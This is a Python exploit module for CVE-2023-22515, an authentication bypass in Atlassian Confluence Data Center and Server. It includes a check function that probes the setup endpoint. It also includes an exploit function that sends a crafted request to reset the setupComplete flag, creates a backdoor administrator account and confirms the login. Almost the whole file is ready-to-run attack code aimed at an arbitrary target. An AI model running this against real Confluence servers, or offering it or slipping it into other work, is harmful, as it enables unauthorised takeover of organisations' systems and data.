"""CVE-2023-22515 â€” Atlassian Confluence Authentication Bypass.

Exploits the broken access-control flaw in Confluence Data Center / Server
that allows an unauthenticated attacker to re-trigger the setup wizard and
create a new administrator account.
"""

from __future__ import annotations

import requests


def check(target: str, *, timeout: int = 10) -> dict:
    """Probe whether the setup endpoint is accessible."""
    setup_url = f"{target.rstrip('/')}/setup/setupadministrator.action"
    try:
        resp = requests.get(setup_url, timeout=timeout)
        return {
            "cve": "CVE-2023-22515",
            "vulnerable": resp.status_code == 200,
            "setup_url": setup_url,
        }
    except requests.RequestException as exc:
        return {
            "cve": "CVE-2023-22515",
            "vulnerable": False,
            "error": str(exc),
        }


def exploit(
    target: str,
    *,
    username: str = "admin_backdoor",
    password: str = "Changeme123!",
    timeout: int = 10,
) -> dict:
    """Trigger the setup wizard, create an admin account, and verify login."""
    base = target.rstrip("/")
    session = requests.Session()
    try:
        trigger_url = f"{base}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"
        session.get(trigger_url, timeout=timeout)

        setup_url = f"{base}/setup/setupadministrator.action"
        session.post(
            setup_url,
            data={
                "username": username,
                "fullName": username,
                "email": f"{username}@exploit.local",
                "password": password,
                "confirm": password,
                "setup-next-button": "Next",
            },
            timeout=timeout,
        )

        login_url = f"{base}/dologin.action"
        login_resp = session.post(
            login_url,
            data={"os_username": username, "os_password": password},
            timeout=timeout,
            allow_redirects=False,
        )

        return {
            "cve": "CVE-2023-22515",
            "success": login_resp.status_code in (200, 302),
            "credentials": {"username": username, "password": password},
        }
    except requests.RequestException as exc:
        return {
            "cve": "CVE-2023-22515",
            "success": False,
            "error": str(exc),
        }
